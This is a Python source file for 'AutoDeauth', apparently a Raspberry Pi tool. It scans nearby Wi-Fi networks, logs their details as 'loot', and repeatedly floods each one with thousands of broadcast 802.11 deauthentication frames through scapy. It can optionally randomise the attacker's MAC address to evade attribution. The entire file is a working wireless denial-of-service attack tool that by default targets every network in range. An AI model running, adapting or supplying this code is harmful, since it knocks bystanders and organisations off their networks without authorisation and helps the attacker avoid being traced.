#!/usr/bin/python3

from multiprocessing import connection
import os

if os.geteuid() != 0:
    exit(
        "You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting."
    )

import time, json, logging, sys
import argparse, subprocess, threading

import wifi  # Used to scan for local networks

try:
    import RPi.GPIO as GPIO  # Used for GPI pin control
except (RuntimeError):
    pass
from scapy.all import (
    RadioTap,  # Adds additional metadata to an 802.11 frame
    Dot11,  # For creating 802.11 frame
    Dot11Deauth,  # For creating deauth frame
    sendp,  # for sending packets
)

LOG_DIR = "/var/log/autodeauth/"


"""Formats a string

Keyword arguments:
string -- String to format

Return
Formatted string or None if it could not be parsed
"""
format_string = (
    lambda string: None if r"\x00" in string or len(string) == 0 else string.strip()
)
"""
Creates a directory to store the json file

Keyword arguments:
ssid -- ssid to create loot directory for

Return
the filepath for the network
"""
get_loot_file = lambda ssid: f"{LOG_DIR}/loot/{ssid.replace(' ', '')}.json"

LOG_DIR = "/var/log/autodeauth/"


def save_dict_to_json_file(file_path: str, content: dict) -> bool:
    """Saves a python dictionary to a json file

    Keyword arguments:
    file_path -- File path to save the dictionary
    content   -- Dictionary to save

    Return
    False if the file was not saved or parsed
    """
    try:
        with open(file_path, "a+") as json_file:
            json.dump(content, json_file, indent=4)
        return True
    except (TypeError, EnvironmentError):
        return False


class InterfaceManager:
    def __eq__(self, intertfaceObject) -> bool:
        try:
            return self.interface == intertfaceObject.interface
        except AttributeError:
            return False

    def __bool__(self) -> bool:
        return (
            os.path.exists(f"/sys/class/net/{self.interface}/operstate")
            and self.enabled
        )

    def __init__(self, interface: str) -> None:
        self.interface = interface
        self.enabled = True
        self.mode = None
        self.create_logger()

    def create_logger(self) -> None:
        """
        Creates a logging object
        """
        self.logger = logging.getLogger("interfaceManager")
        self.logger.setLevel(logging.DEBUG)
        formatter = logging.Formatter("%(asctime)s - %(message)s", "%Y-%m-%d %H:%M:%S")
        stream_handler = logging.StreamHandler(sys.stdout)
        stream_handler.setFormatter(formatter)
        file_handler = logging.FileHandler(f"{LOG_DIR}/log")
        file_handler.setFormatter(formatter)
        self.logger.addHandler(stream_handler)
        self.logger.addHandler(file_handler)

    def get_local_networks(self) -> list:
        try:
            if self.mode == "monitor":
                self.set_mode_managed()
            networks = list(set(wifi.Cell.all(self.interface)))
            if not networks:
                return networks

            return [
                network
                for network in networks
                if format_string(network.ssid) is not None
            ]

        except wifi.exceptions.InterfaceError:
            self.logger.error(
                f"Restarting interface: {self.interface} an issue occurred"
            )
            self.restart_network_adapter()

    def did_os_command_succeed(self, command: str) -> bool:
        """Runs a command and returns true if it worked

        Keyword arguments:
        command -- command to run

        Return
        False if the command did not succeded
        """
        process: tuple = subprocess.getstatusoutput(command)
        # first item is respsonse code
        if process[0] == 0:
            return True
        return False

    def deauth_network(
        self,
        bssid_address: str,
        target_mac_address: str = "ff:ff:ff:ff:ff:ff",
        packet_count: int = 5000,
        frequency: int = 0,
        verbose: int = 0,
    ) -> bool:
        """
        Saves the network object to a json file

        Keyword arguments:
        bssid_address      --  MAC address of the router to deauth
        target_mac_address --  MAC address of the target device to deauth (default: ff:ff:ff:ff:ff:ff) (ALL)
        packet_count       --  Amount of deauth frames to send default: 5000
        frequency          --  Time between packets sending
        verbose            --  Scapy verbosity

        Return
        False if the file could not be saved
        """
        if self.mode != "monitor" and not self.set_mode_monitor():
            return False
        dot11 = Dot11(
            addr1=target_mac_address, addr2=bssid_address, addr3=bssid_address
        )
        frame = RadioTap() / dot11 / Dot11Deauth()
        sendp(
            frame,
            iface=self.interface,
            count=packet_count,
            inter=frequency,
            verbose=verbose,
        )
        self.set_mode_managed()
        return True

    def set_down(self) -> bool:
        """Sets the primary adapter down

        Return:
        True if the adapter was set down
        """
        if not self.did_os_command_succeed(f"sudo ifconfig {self.interface} down"):
            self.logger.error(f"Failed to set {self.interface} down")
            return False
        time.sleep(2)
        return True

    def set_up(self) -> bool:
        """Sets the primary adapter up

        Return:
        True if the adapter was set up
        """
        if not self.did_os_command_succeed(f"sudo ifconfig {self.interface} up"):
            self.logger.error(f"Failed to set {self.interface} up")
            return False
        time.sleep(2)
        return True

    def change_mac_address(self):
        if not self.set_down():
            return False
        if not self.did_os_command_succeed(f"sudo macchanger -b -r {self.interface}"):
            self.logger.error("Failed to change MAC address")
            return False
        return self.set_up()

    def restart_networking_service(self) -> bool:
        """
        Attempts to restart the networking service and the network-manager service
        """
        if not self.did_os_command_succeed(
            "sudo service networking restart"
        ) and not self.did_os_command_succeed("sudo service network-manager restart"):
            self.logger("Failed to restart services: networking, and network-manager")
            return False
        return True

    def set_mode_monitor(self) -> bool:
        """
        Sets the network interface into monitor mode
        """
        if not self.set_down():
            return False
        if not self.did_os_command_succeed(
            f"sudo iwconfig {self.interface} mode monitor"
        ):
            self.logger.error(f"Failed to set {self.interface} to monitor mode")
            return False
        if not self.set_up():
            return False
        self.monitor_mode = True
        return True

    def set_mode_managed(self) -> bool:
        """
        Sets the network interface into managed mode
        """
        if not self.set_down():
            return False
        if not self.did_os_command_succeed(
            f"sudo iwconfig {self.interface} mode managed"
        ):
            self.logger.error(f"Failed to set {self.interface} to managed")
            return False
        if self.set_up():
            return False
        self.monitor_mode = False
        return True

    def restart_network_adapter(self) -> bool:
        """
        Restart the primary network adapter
        """
        return self.set_down() and self.set_up()

    def stop(self) -> None:
        if self.mode != "managed":
            self.set_mode_managed()
        self.enabled = False


class AutoDeauth:
    def __init__(self, **kwargs) -> None:
        """AutoDeauth

        Keyword arguments:
        network_interface -- Interface to run the attack (must support packet injection)
        ssid_blacklist    -- Networks to avoid
        ssid_whitelist    -- Targets to only attack
        led               -- Enable LED Indicators (default: False)

        Return
        False if the file was not saved
        """
        self.interface = kwargs.get("interface")
        self.interface = InterfaceManager(self.interface)
        self.ssid_blacklist = kwargs.get("blacklist")
        self.ssid_whitelist = kwargs.get("whitelist")
        self.deauth_led = kwargs.get("led")
        self.time = kwargs.get("time")
        self.count = kwargs.get("count")
        self.random = kwargs.get("random")
        self.ignore = kwargs.get("ignore")
        self.verbose = kwargs.get("verbose")
        self.monitor_mode = False
        self.create_logger()
        if self.deauth_led:
            self.init_gpio_pins()
        self.blink_thread = None
        self.is_done = True

    def init_gpio_pins(self) -> None:
        """
        Sets up the selected GPIO pin
        """
        GPIO.setup(self.deauth_led, GPIO.OUT)

    def blink_led(self) -> None:
        """
        Thread that blinks the led when deauthing a network
        """
        while not self.is_done:
            GPIO.output(self.deauth_led, GPIO.HIGH)
            time.sleep(0.2)
            GPIO.output(self.deauth_led, GPIO.LOW)
            time.sleep(0.2)
        GPIO.output(self.deauth_led, GPIO.LOW)

    def create_logger(self) -> None:
        """
        Creates a logging object
        """
        self.logger = logging.getLogger("autodeauth")
        self.logger.setLevel(logging.DEBUG)
        formatter = logging.Formatter("%(asctime)s - %(message)s", "%Y-%m-%d %H:%M:%S")
        stream_handler = logging.StreamHandler(sys.stdout)
        stream_handler.setFormatter(formatter)
        file_handler = logging.FileHandler(f"{LOG_DIR}/log")
        file_handler.setFormatter(formatter)
        self.logger.addHandler(stream_handler)
        self.logger.addHandler(file_handler)

    def save_information(self, network: wifi.Cell) -> bool:
        """
        Saves the network object to a json file

        Keyword arguments:
        network -- Network object to save

        Return
        False if the file could not be saved
        """
        file_path = get_loot_file(network.ssid)
        json_obj = {
            "ssid": network.ssid,
            "mac_address": network.address,
            "channel": network.channel,
            "network.frequency": network.frequency,
            "mode": network.mode,
            "bitrates": network.bitrates,
            "encryption_type": network.encryption_type,
            "encrypted": network.encrypted,
            "quality": network.quality,
            "signal": network.signal,
        }
        if save_dict_to_json_file(file_path, json_obj):
            return True
        self.logger.error(f"Failed to save {network.ssid} to {file_path}")

    def get_filtered_networks(self) -> list:
        try:
            networks = self.interface.get_local_networks()
            filtered_networks = []
            if not networks:
                return []
            for network in networks:
                ssid = format_string(network.ssid)
                if not ssid or self.ssid_blacklist and (network.address in self.ssid_blacklist or ssid in self.ssid_blacklist):
                    continue
                elif not self.ssid_whitelist or self.ssid_whitelist and ssid in self.ssid_whitelist or self.ssid_whitelist and network.address in self.ssid_whitelist:
                    self.save_information(network)
                    filtered_networks.append(network)
            return filtered_networks
        except (KeyboardInterrupt):
            self.stop()

    def start(self) -> None:
        if not self.interface:
            self.logger.error(
                f"Failed to start {self.interface.interface} is not a valid interface!"
            )
            self.stop()
        while True:
            try:
                networks = self.get_filtered_networks()
                for network in networks:
                    self.logger.info(
                        f"Sending {self.count} deauth frames to network: {network.address} -- {network.ssid}"
                    )

                    if self.deauth_led:
                        self.is_done = False
                        self.blink_thread = threading.Thread(target=self.blink_led)
                        self.blink_thread.start()

                    if self.random:
                        if not self.interface.change_mac_address() and not self.ignore:
                            self.logger.error("Failed to change MAC address")
                            self.stop()

                    if not self.interface.deauth_network(
                        network.address,
                        packet_count=self.count,
                        frequency=self.time,
                        verbose=self.verbose,
                    ):
                        self.logger.error(
                            f"Failed to deauth {network.address} -- {network.ssid}"
                        )
                    self.is_done = True
                    if self.deauth_led and self.is_done and self.blink_thread:
                        self.blink_thread.join()
            except OSError as e: 
                self.logger.warning(f"{e} Reducing packet count to {1000}")
                self.count = 1000
            except (KeyboardInterrupt):
                self.stop()

    def stop(self) -> None:
        self.logger.info("Exiting/Cleaning up")
        if self.interface:
            self.interface.stop()
        if self.deauth_led and self.blink_thread:
            self.is_done = True
            self.blink_thread.join()
        if self.deauth_led:
            GPIO.cleanup()
        exit()


if __name__ == "__main__":
    print(
        """
        _       _       ___                _   _    
       /_\ _  _| |_ ___|   \ ___ __ _ _  _| |_| |_  
      / _ \ || |  _/ _ \ |) / -_) _` | || |  _| ' \ 
     /_/ \_\_,_|\__\___/___/\___\__,_|\_,_|\__|_||_|\n"""
    )
    parser = argparse.ArgumentParser(description="Auto Deauth Tool")
    parser.add_argument(
        "--interface",
        "-i",
        help="Interface to fetch WiFi networks and send deauth packets (must support packet injection) ",
        required=True,
    )
    parser.add_argument(
        "--blacklist",
        "-b",
        help="List of networks ssids/mac addresses to avoid (Comma seperated)",
        type=lambda arg: arg.split(","),
    )
    parser.add_argument(
        "--whitelist",
        "-w",
        help="List of networks ssids/mac addresses to target (Comma seperated)",
        type=lambda arg: arg.split(","),
    )
    parser.add_argument("--led", "-l", help="Led pin number for led display", type=int)
    parser.add_argument(
        "--time",
        "-t",
        help="Time (in s) between two deauth packets (default 0)",
        default=0,
    )
    parser.add_argument(
        "--random",
        "-r",
        help="Randomize your MAC address before deauthing each network",
        default=False,
        action="store_true",
    )
    parser.add_argument(
        "--ignore",
        help="Ignore errors encountered when randomizing your MAC address",
        default=False,
        action="store_true",
    )
    parser.add_argument(
        "--count",
        "-c",
        help="Number of packets to send (default 5000)",
        type=int,
        default=5000,
    )
    parser.add_argument(
        "--verbose",
        "-v",
        help="Scapy verbosity setting (default: 0)",
        type=int,
        default=0,
    )
    args = parser.parse_args()
    data = vars(args)
    if args.led:
        try:
            GPIO.setmode(GPIO.BOARD)
        except (NameError, ImportError, RuntimeError):
            # GPIO Mode can only be ran on a raspberry pi
            # File "/usr/local/lib/python3.10/dist-packages/RPi/GPIO/__init__.py", line 23, in <module>
            #
            # from RPi._GPIO import *
            # RuntimeError: This module can only be run on a Raspberry Pi!

            exit(
                "Unable to setup LED indicator, t doesnt look like you are running using raspberry pi"
            )
    a = AutoDeauth(**data)
    try:
        a.start()
    except OSError:
        time.sleep(30)
        a.start()
